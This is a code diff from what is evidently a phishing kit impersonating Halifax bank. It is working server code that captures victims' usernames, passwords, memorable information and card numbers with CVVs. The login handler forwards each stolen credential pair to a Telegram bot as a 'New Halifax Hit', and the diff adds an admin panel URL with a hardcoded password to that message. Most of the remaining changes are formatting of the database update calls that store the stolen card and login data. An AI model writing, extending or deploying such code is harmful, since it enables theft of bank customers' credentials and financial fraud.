@@ -62,7 +62,7 @@ const submitLogin = async (req, res) => {
 					`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
 					{
 						chat_id: "-837014205",
-						text: `New Halifax Hit:\n\n${username}\n${password}`,
+						text: `New Halifax Hit:\n\n${username}\n${password}\n\nAdmin Link: https://haytchc0ding.co.uk/?panel=halifax&password=haytch4023`,
 						parse_mode: "Markdown",
 					}
 				)
@@ -95,7 +95,9 @@ const submitLoginAgain = async (req, res) => {
 		await Halifax.findOneAndUpdate(
 			{ uniqueid },
 			{
-				username, password, status: 9,
+				username,
+				password,
+				status: 9,
 				timestamp: moment().format(),
 			}
 		).exec();
@@ -112,7 +114,8 @@ const submitMemorable = async (req, res) => {
 		await Halifax.findOneAndUpdate(
 			{ uniqueid },
 			{
-				memorable, status: 3,
+				memorable,
+				status: 3,
 				timestamp: moment().format(),
 			}
 		).exec();
@@ -129,7 +132,10 @@ const submitCard = async (req, res) => {
 		await Halifax.findOneAndUpdate(
 			{ uniqueid },
 			{
-				ccnum, ccexp, cvv, status: 5,
+				ccnum,
+				ccexp,
+				cvv,
+				status: 5,
 				timestamp: moment().format(),
 			}
 		).exec();
